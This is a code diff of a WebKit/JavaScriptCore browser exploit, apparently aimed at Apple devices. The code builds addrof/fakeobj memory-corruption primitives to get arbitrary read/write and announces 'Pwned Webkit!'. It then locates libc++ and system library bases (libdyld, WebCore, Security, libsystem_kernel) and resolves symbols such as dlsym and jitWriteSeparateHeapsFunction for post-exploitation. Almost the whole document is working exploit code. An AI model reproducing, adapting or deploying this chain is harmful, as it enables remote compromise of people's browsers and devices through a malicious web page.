@@ -82,12 +82,6 @@ function setup_addrof_fakeobj() {
         hax(target,n);
     }
 
-    if(float_arr.length == 0x1337) {
-        log("[*] JSArray.length = 0x" + float_arr.length.toString(16));
-        log("[*] Successful corrupted JSArray");
-        // return;
-    }
-
     // (OOB) index into float_arr that overlaps with the first element of obj_arr.
     // Index 7 (directly behind the last element) overlaps with the header of the next butterfly.
     const OVERLAP_IDX = 8;
@@ -143,7 +137,6 @@ function get_dylib_name(macho_base) {
     while(true) {
         lc_cmd = read32(lc)
         if(lc_cmd == 0xd) { //LC_ID_DYLIB
-            // log(`[+] Found LC_ID_DYLIB at: ${lc}`);
             break;
         }
 
@@ -156,28 +149,38 @@ function get_dylib_name(macho_base) {
     return dylib_name;
 }
 
-function find_dylib_by_name(macho_base, name) {
-    var dylib_name = get_dylib_name(macho_base);
-    if(dylib_name == name)
-        return macho_base;
-
-    while(true) {
-        var vm_size = read64(Add(macho_base, 0x40));
-
-        var next_dylib = Add(macho_base, vm_size)
-
-        dylib_name = get_dylib_name(next_dylib);
-
-        if(dylib_name.includes(name)) {
-            log(`[*] dylib_name: ${dylib_name}`);
-            return next_dylib;
-        }
-
-        macho_base = next_dylib;
+function obtain_dylibs_base(base, nameList) {
+    var results = [];
+    for (var i = 0; i < nameList.length; i++) {
+        results[i] = null;
     }
 
-    return 0;
+    var found = 0;
+    var cur   = base;
+
+    while (cur && found < nameList.length) {
+        var realName = get_dylib_name(cur);
+
+        for (var j = 0; j < nameList.length; j++) {
+            var nm = nameList[j];
+            if (results[j] === null && realName.indexOf(nm) !== -1) {
+                results[j] = cur;
+                found++;
+                log(`[+] ${nm}: ${cur}`);
+            }
+        }
+
+        if (found === nameList.length) {
+            break;
+        }
+
+        var vmSize = read64(Add(cur, 0x40));
+        cur = Add(cur, vmSize);
+    }
+
+    return results;
 }
+
 
 function find_symbol_address(macho_base, name) {
     var ncmds = read32(Add(macho_base, 0x10));
@@ -192,19 +195,15 @@ function find_symbol_address(macho_base, name) {
             break;
         }
 
-        var lc_cmdsize = read32(Add(lc, 4)); //offsetof(load_command, cmdsize)=4
+        var lc_cmdsize = read32(Add(lc, 4));
         ptr = Add(ptr, lc_cmdsize);
     }
-    // log(`[*] symtab_cmd: ${symtab_cmd}`);
-
-
 
     ptr = Add(macho_base, 0x20);
     var text_segment = 0;
     for (var i = 0; i < ncmds; i++) {
         var sc = ptr;
         var sc_segname = readString(Add(sc, 8));
-        // log(`[*] sc_segname: ${sc_segname}`);
         if(sc_segname === "___TEXT") {
 			text_segment = sc;
             break;
@@ -213,17 +212,8 @@ function find_symbol_address(macho_base, name) {
         var sc_cmdsize = read32(Add(sc, 4));
         ptr = Add(ptr, sc_cmdsize);
     }
-    // log(`[*] text_segment: ${text_segment}`);
     var text_segment_vmaddr = read32(Add(text_segment, 0x18));
 	var slide = Sub(macho_base, text_segment_vmaddr);
-	// log(`[*] slide: ${slide}`);
-
-
-
-
-
-
-
 
     ptr = Add(macho_base, 0x20);
 	var linkedit_segment = 0;
@@ -237,24 +227,16 @@ function find_symbol_address(macho_base, name) {
         var sc_cmdsize = read32(Add(sc, 4));
         ptr = Add(ptr, sc_cmdsize);
     }
-    // log(`[*] linkedit_segment: ${linkedit_segment}`);
     var linkedit_segment_vmaddr = read32(Add(linkedit_segment, 0x18));
     var linkedit_segment_fileoff = read32(Add(linkedit_segment, 0x28));
 	var linkedit_base = Sub(Add(slide, linkedit_segment_vmaddr), linkedit_segment_fileoff);
-	// log(`[*] linkedit_base: ${linkedit_base}`);
-
-
-
-
-
 
     var string_table = Add(linkedit_base, read32(Add(symtab_cmd, 0x10)));
     var sym_table = Add(linkedit_base, read32(Add(symtab_cmd, 8)));
     var nsyms = read32(Add(symtab_cmd, 0xc));
 
-    // 3) 모든 심볼 순회하며 이름 비교
     for (var i = 0; i < nsyms; i++) {
-        var symtable_n_value = read64(Add(sym_table, i * 16 + 8));     //sym_table[i].n_value
+        var symtable_n_value = read64(Add(sym_table, i * 16 + 8));
         if(symtable_n_value) {
             var strtab_offset = read32(Add(sym_table, i * 16 + 0));
 
@@ -266,10 +248,68 @@ function find_symbol_address(macho_base, name) {
         }
     }
 
-
-
-
     return 0;
+}
+
+function obtain_libcpp_base(vtab_addr) {
+    var adrpldr_ZSt7nothrow_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
+    adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x94c00);
+
+    var try_count = 0;
+    var opcode;
+    while (true) {
+        if(try_count > 0x1000) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        opcode = read64(adrpldr_ZSt7nothrow_addr);
+
+        // WebCore:__text:000000018AF86AA0 CB 01 00 54                             B.LT            loc_18AF86AD8
+        // WebCore:__text:000000018AF86AA4 E8 EF 40 B2                             MOV             X8, #0xFFFFFFFFFFFFFFF
+        if(opcode == 0xB240EFE8540001CB) {
+            break;
+        }
+        adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x4);
+        try_count++;
+    }
+
+    try_count = 0;
+    while (true) {
+        if(try_count > 0x100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        opcode = read32(adrpldr_ZSt7nothrow_addr);
+        if(((opcode & 0x9F000000) >>> 0) == 0x90000000)  //Is ADRP?
+            break;
+            
+        adrpldr_ZSt7nothrow_addr = Add(adrpldr_ZSt7nothrow_addr, 0x4);
+
+        try_count++;
+    }
+
+    var ZSt7nothrow_ptr = follow_adrpLdr(adrpldr_ZSt7nothrow_addr);
+    var libcpp_ZSt7nothrow_addr = read64(ZSt7nothrow_ptr);
+    var libcpp1_base = Sub(libcpp_ZSt7nothrow_addr, libcpp_ZSt7nothrow_addr.lo() & 0xfff);
+
+    try_count = 0;
+    while (true) {
+        if(try_count > 0x100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        machoMagic = read64(libcpp1_base);
+
+        if(machoMagic == 0x100000CFEEDFACF) {
+            break;
+        }
+        libcpp1_base = Sub(libcpp1_base, 0x1000);
+        try_count++;
+    }
+    return libcpp1_base;
 }
 
 function pwn() {
@@ -304,7 +344,6 @@ function pwn() {
 
     let container_addr = addrof(container);
     let fake_array_addr = Add(container_addr, 16);
-    log("[*] Fake JSArray @ " + fake_array_addr);
 
     let fake_arr = fakeobj(fake_array_addr);
 
@@ -320,9 +359,6 @@ function pwn() {
     }
     jscell_header = results[0];
     container.jscell_header = jscell_header;
-    log(`[*] Copied legit JSCell header: ${Int64.fromDouble(jscell_header)}`);
-
-    log("[+] Achieved limited arbitrary read/write \\o/");
 
     // The controller array writes into the memarr array.
     let controller = fake_arr;
@@ -389,122 +425,47 @@ function pwn() {
     
     var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
     var FPO = spectre ? 0x18 : 0x10; 
-    log(`[*] FPO: ${FPO}`);
 
     var wrapper = document.createElement('div');
     var wrapper_addr = addrof(wrapper);
-    log(`[*] wrapper_addr = ${(wrapper_addr)}`); 
     var el_addr = read64(Add(wrapper_addr, FPO));
-    log(`[*] el_addr = ${(el_addr)}`); 
     var vtab_addr = read64(el_addr);
-    log(`[*] vtab_addr = ${(vtab_addr)}`);
+    log(`[+] Pwned Webkit! Running post-exploitation...\n\n`);
 
-    // Find libcpp_base
-    var adrpldr_ZSt7nothrow_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
-    // log(`[*] adrpldr_ZSt7nothrow_addr = ${(adrpldr_ZSt7nothrow_addr)} -> ${read64(adrpldr_ZSt7nothrow_addr)}  ${read64(Add(adrpldr_ZSt7nothrow_addr, 8))}`);
-    // return;
-    adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x94c00);
+    // 1. Obtain libc++.1 base
+    log(`[i] [Stage 1] Obtaining libc++.1 base...`);
+    var libcpp1_base = obtain_libcpp_base(vtab_addr);
+    log(`[+] Obtained libc++.1 base: ${libcpp1_base}`);
 
-    var try_count = 0;
-    var opcode;
-    while (true) {
-        if(try_count > 0x1000) {
-            log(`[-] failed webkit patchfinder`);
-            return;
-        }
+    // 2. Obtain Libs Base
+    log(`[i] [Stage 2] Obtaining other dylibs base...`);
+    const dylibNames = [
+        "/usr/lib/system/libdyld.dylib",
+        "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",
+        "/System/Library/Frameworks/CoreAudio.framework/CoreAudio",
+        "/System/Library/PrivateFrameworks/WebCore.framework/WebCore",
+        "/System/Library/Frameworks/Security.framework/Security",
+        "/System/Library/PrivateFrameworks/AirPlayReceiver.framework/AirPlayReceiver",
+        "/usr/lib/system/libsystem_platform.dylib",
+        "/usr/lib/system/libsystem_kernel.dylib",
+        "/usr/lib/system/libsystem_c.dylib"
+    ];
+    var dylibBases = obtain_dylibs_base(libcpp1_base, dylibNames);
 
-        opcode = read64(adrpldr_ZSt7nothrow_addr);
-
-        // WebCore:__text:000000018AF86AA0 CB 01 00 54                             B.LT            loc_18AF86AD8
-        // WebCore:__text:000000018AF86AA4 E8 EF 40 B2                             MOV             X8, #0xFFFFFFFFFFFFFFF
-        if(opcode == 0xB240EFE8540001CB) {
-            break;
-        }
-        adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x4);
-        try_count++;
-    }
-
-    try_count = 0;
-    while (true) {
-        if(try_count > 0x100) {
-            log(`[-] failed webkit patchfinder`);
-            return;
-        }
-
-        opcode = read32(adrpldr_ZSt7nothrow_addr);
-        if(((opcode & 0x9F000000) >>> 0) == 0x90000000)  //Is ADRP?
-            break;
-            
-        adrpldr_ZSt7nothrow_addr = Add(adrpldr_ZSt7nothrow_addr, 0x4);
-
-        try_count++;
-    }
-    log(`[+] found adrpldr __ZSt7nothrow addr: ${adrpldr_ZSt7nothrow_addr}`);
-
-    var ZSt7nothrow_ptr = follow_adrpLdr(adrpldr_ZSt7nothrow_addr);
-    log(`[*] ZSt7nothrow_ptr: ${ZSt7nothrow_ptr}`);
-
-    var libcpp_ZSt7nothrow_addr = read64(ZSt7nothrow_ptr);
-    log(`[*] libcpp_ZSt7nothrow_addr: ${libcpp_ZSt7nothrow_addr}`);
-
-    var libcpp1_base = Sub(libcpp_ZSt7nothrow_addr, libcpp_ZSt7nothrow_addr.lo() & 0xfff);
-    try_count = 0;
-    while (true) {
-        if(try_count > 0x100) {
-            log(`[-] failed webkit patchfinder`);
-            return;
-        }
-
-        machoMagic = read64(libcpp1_base);
-
-        if(machoMagic == 0x100000CFEEDFACF) {
-            break;
-        }
-        libcpp1_base = Sub(libcpp1_base, 0x1000);
-        try_count++;
-    }
-
-    //Libs Base
-    log(`[+] libcpp_base: ${libcpp1_base}, try_count: ${try_count}`);
-    
-    var libdyld_base = find_dylib_by_name(libcpp1_base, "libdyld")
-    log(`[+] libdyld_base: ${libdyld_base}`);
-
-    var jsc_base = find_dylib_by_name(libcpp1_base, "JavaScriptCore")
-    log(`[+] jsc_base: ${jsc_base}`);
-
-    var dyld_shared_cache_addr = Sub(libcpp1_base, 0x31000);
-    log(`[+] dyld_shared_cache_addr: ${(dyld_shared_cache_addr)}`);
-
-    var coreaudio_base = find_dylib_by_name(libcpp1_base, "CoreAudio")
-    log(`[+] coreaudio_base: ${coreaudio_base}`);
-
-    var webcore_base = find_dylib_by_name(libcpp1_base, "/System/Library/PrivateFrameworks/WebCore.framework/WebCore")
-    log(`[+] webcore_base: ${webcore_base}`);
-
-    var security_base = find_dylib_by_name(libcpp1_base, "/System/Library/Frameworks/Security.framework/Security")
-    log(`[+] security_base: ${security_base}`);
-
-    var airplayreceiver_base = find_dylib_by_name(libcpp1_base, "/System/Library/PrivateFrameworks/AirPlayReceiver.framework/AirPlayReceiver")
-    log(`[+] airplayreceiver_base: ${airplayreceiver_base}`);
-
-
-    var libsystem_platform_base = find_dylib_by_name(libcpp1_base, "libsystem_platform")
-    log(`[+] libsystem_platform_base: ${libsystem_platform_base}`);
-
-    var libsystem_kernel_base = find_dylib_by_name(libcpp1_base, "libsystem_kernel")
-    log(`[+] libsystem_kernel_base: ${libsystem_kernel_base}`);
-
-    var libsystem_c = find_dylib_by_name(libcpp1_base, "libsystem_c")
-    log(`[+] libsystem_c: ${libsystem_c}`);
+    var libdyld_base = dylibBases[0];
+    var jsc_base = dylibBases[1];
+    var coreaudio_base = dylibBases[2];
+    var webcore_base = dylibBases[3];
+    var security_base = dylibBases[4];
+    var airplayreceiver_base = dylibBases[5];
+    var libsystem_platform_base = dylibBases[6];
+    var libsystem_kernel_base = dylibBases[7];
+    var libsystem_c = dylibBases[8];
 
     //find symbols..
     var dlsym_addr = find_symbol_address(libdyld_base, "__dlsym");
     log(`[+] dlsym: ${dlsym_addr}`);
 
-    //TEMPORARY DISABLED START
-    var temp_disabled = false;
-    if(!temp_disabled) {
     var jitWriteSeparateHeaps_addr = find_symbol_address(jsc_base, "___ZN3JSC29jitWriteSeparateHeapsFunctionE");
     log(`[+] jitWriteSeparateHeaps: ${jitWriteSeparateHeaps_addr}`);
 
@@ -526,8 +487,8 @@ function pwn() {
     var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
     __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
     log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
-    }
-    //TEMPORARY DISABLED END
+
+    return;
 
     
     
